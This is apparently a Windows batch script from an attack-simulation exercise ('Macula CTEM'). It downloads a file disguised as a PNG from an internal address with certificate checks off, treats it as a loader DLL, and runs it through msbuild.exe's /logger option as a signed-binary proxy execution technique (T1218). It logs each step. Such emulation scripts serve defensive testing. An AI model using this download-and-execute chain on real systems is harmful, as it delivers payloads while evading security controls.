@echo off
setlocal enabledelayedexpansion

REM ============================================================
REM STAGE 2 BAT BOOTSTRAP - MACULA CTEM SIMULATION
REM ============================================================

REM ---- Random-named SET variables for PHR placeholders ----
SET r1a2b3c=%APPDATA%\10407\8527a18e
SET d4e5f6g=bc732976.txt
SET h7i8j9k=https://10.0.0.49/stage/2/icon.png?10407-7
SET l0m1n2o=ITZEL-S2B
SET p3q4r5s=10407
SET t6u7v8w=7
SET x9y0z1a=%APPDATA%\7\macula-simulations.log

REM ---- Initialize log file path (using required pattern) ----
SET logfile=%APPDATA%\!t6u7v8w!\macula-simulations.log

REM ---- Cache timestamp at script start (percent expansion) ----
SET tsvar=%DATE%/%TIME%

REM ---- 1. Debug: heartbeat_start ----
echo [!tsvar!][DEBUG][!l0m1n2o!][!p3q4r5s!]: heartbeat_start>> "!logfile!" 2>nul

REM ---- 2. Heartbeat fetch (download Stage 2 Loader DLL) ----
curl -k -s -o "!r1a2b3c!\!d4e5f6g!" "!h7i8j9k!"

REM ---- 3. Debug: heartbeat_complete ----
echo [!tsvar!][DEBUG][!l0m1n2o!][!p3q4r5s!]: heartbeat_complete>> "!logfile!" 2>nul

REM ---- 4. Debug: chdir_start ----
echo [!tsvar!][DEBUG][!l0m1n2o!][!p3q4r5s!]: chdir_start>> "!logfile!" 2>nul

REM ---- 5. Change directory to output location ----
cd /d "!r1a2b3c!" >nul 2>&1

REM ---- 6. Debug: chdir_result ----
echo [!tsvar!][DEBUG][!l0m1n2o!][!p3q4r5s!]: chdir_result=!ERRORLEVEL!>> "!logfile!" 2>nul

REM ---- 7. Create minimal .proj file for msbuild ----
echo ^<Project/^> > "!r1a2b3c!\build.proj"

REM ---- 8. Debug: msbuild_start ----
echo [!tsvar!][DEBUG][!l0m1n2o!][!p3q4r5s!]: msbuild_start>> "!logfile!" 2>nul

REM ---- 9. Invoke Stage 2 Loader via msbuild /logger: LOLBIN ----
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe "!r1a2b3c!\build.proj" /logger:LoggerEntry,"!r1a2b3c!\!d4e5f6g!";MyParameters,Foo >NUL 2>&1

REM ---- 10. Debug: msbuild_complete ----
echo [!tsvar!][DEBUG][!l0m1n2o!][!p3q4r5s!]: msbuild_complete=!ERRORLEVEL!>> "!logfile!" 2>nul

REM ---- 11. Check ERRORLEVEL and log TTP result ----
IF !ERRORLEVEL! EQU 0 (
    echo [%date% %time%][TTP][!l0m1n2o!][!p3q4r5s!]: T1218^|System Binary Proxy Execution=[OK]:[]>> "!logfile!" 2>nul
) ELSE (
    echo [%date% %time%][TTP][!l0m1n2o!][!p3q4r5s!]: T1218^|System Binary Proxy Execution=[FAIL]:[lolbin_execution_failed]>> "!logfile!" 2>nul
)

REM ---- 12. Script terminates ----
exit /b 0